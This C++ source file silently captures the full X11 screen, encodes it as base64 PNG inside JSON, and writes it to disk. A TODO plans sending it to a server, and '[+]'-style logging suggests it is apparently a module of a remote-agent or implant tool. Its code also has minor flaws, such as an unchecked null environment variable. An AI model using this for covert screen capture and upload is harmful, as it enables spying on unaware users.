#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <png.h>
#include "json.hpp" // TODO: we should use the same library from a known location
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstdlib>


// Function to convert image data to base64
std::string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len) {
    static const std::string base64_chars =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789+/";
    std::string ret;
    int i = 0;
    int j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];

    while (in_len--) {
        char_array_3[i++] = *(bytes_to_encode++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (i = 0; (i < 4); i++)
                ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 3; j++)
            char_array_3[j] = '\0';

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);

        for (j = 0; (j < i + 1); j++)
            ret += base64_chars[char_array_4[j]];

        while ((i++ < 3))
            ret += '=';
    }

    return ret;
}

bool save_png_to_memory(std::vector<unsigned char>& out, int w, int h, std::vector<unsigned char>& data) {
    png_structp png = png_create_write_struct(PNG_LIBPNG_VER_STRING, nullptr, nullptr, nullptr);
    if (!png) return false;
    png_infop info = png_create_info_struct(png);
    if (!info) return false;
    if (setjmp(png_jmpbuf(png))) return false;

    png_set_compression_level(png, 3);
    png_set_filter(png, 0, PNG_FILTER_NONE);
    png_set_IHDR(png, info, w, h, 8, PNG_COLOR_TYPE_RGB, PNG_INTERLACE_NONE, PNG_COMPRESSION_TYPE_DEFAULT, PNG_FILTER_TYPE_DEFAULT);

    std::vector<png_bytep> rows(h);
    for (int y = 0; y < h; y++) rows[y] = &data[y * w * 3];

    png_set_rows(png, info, &rows[0]);
    
    png_set_write_fn(png, &out, [](png_structp png_ptr, png_bytep data, png_size_t length) {
        std::vector<unsigned char>* p = (std::vector<unsigned char>*)png_get_io_ptr(png_ptr);
        p->insert(p->end(), data, data + length);
    }, nullptr);

    png_write_png(png, info, PNG_TRANSFORM_IDENTITY, nullptr);

    png_destroy_write_struct(&png, &info);

    return true;
}

void x11_screenshot(std::vector<unsigned char>* data, int& width, int& height){
    Display* display = XOpenDisplay(nullptr);
    if (display == nullptr) {
        std::cerr << "Cannot open display" << std::endl;
    }
    // std::cerr << "[+] display = " << display << std::endl;

    Window root = DefaultRootWindow(display);
    // std::cerr << "[+] root = " << root << std::endl;
    XWindowAttributes attributes = {0};
    XGetWindowAttributes(display, root, &attributes);

    width = attributes.width;
    height = attributes.height;
    int screen = DefaultScreen(display);
    int depth = DefaultDepth(display, screen);
    // std::cerr << "[+] screen = " << screen << ", width = " << width << ", height = " << height << ", depth = " << depth << std::endl;

    XImage* image = XGetImage(display, root, 0, 0, width, height, AllPlanes, ZPixmap);
    if (image == nullptr) {
        std::cerr << "Cannot get the image" << std::endl;
    }
    std::cerr << "[+] Got screenshot image" << std::endl;

    // Resize the vector to hold the new image data
    data->resize(width * height * 3); // Assuming 3 bytes per pixel (RGBA)

    for (int y = 0; y < height; ++y) {
        for (int x = 0; x < width; ++x) {
            unsigned long pixel = XGetPixel(image, x, y);
            int index = (y * width + x) * 3;
            (*data)[index + 0] = (pixel & image->red_mask) >> 16;   // Red
            (*data)[index + 1] = (pixel & image->green_mask) >> 8;  // Green
            (*data)[index + 2] = (pixel & image->blue_mask);        // Blue
        }
    }

    XDestroyImage(image);
    XCloseDisplay(display);
}


int main() {
    std::vector<unsigned char> data;
    int width = 0;
    int height = 0;

    // Check if running on Wayland
    const char* gdm_type = std::getenv("XDG_SESSION_TYPE");
    // std::cerr << "[+] gdm_type = " << gdm_type << std::endl;
    if (std::strcmp(gdm_type, "x11") == 0) {
        std::cerr << "[+] Running on X11" << std::endl;
        x11_screenshot(&data, width, height);
    }
    else if (std::strcmp(gdm_type, "wayland") == 0) {
        std::cerr << "Running on Wayland" << std::endl;
        // const char* wayland_display = std::getenv("WAYLAND_DISPLAY");
        // std::cerr << "Running on Wayland (WAYLAND_DISPLAY is set to " << wayland_display << ")" << std::endl;
        //TODO: add support for wayland
        return 1;
    }

    std::cerr << "[+] Save PNG to memory" << std::endl;
    std::vector<unsigned char> png_data;
    if (!save_png_to_memory(png_data, width, height, data)) {
        std::cerr << "  [-] Failed to save PNG to memory" << std::endl;
        return 1;
    }

    std::cerr << "[+] Encoded image as base64" << std::endl;
    std::string encoded_data = base64_encode(&png_data[0], png_data.size());

    nlohmann::json j;
    j["screenshot"] = encoded_data;

    // TODO: send the json file to the server using the base_class method
    std::ofstream file("screenshot.json");
    if (!file.is_open()) {
        std::cerr << "  [-] Cannot open output file" << std::endl;
        return 1;
    }

    std::cerr << "[+] Create JSON file" << std::endl;
    file << j.dump(4);
    file.close();

    return 0;
}
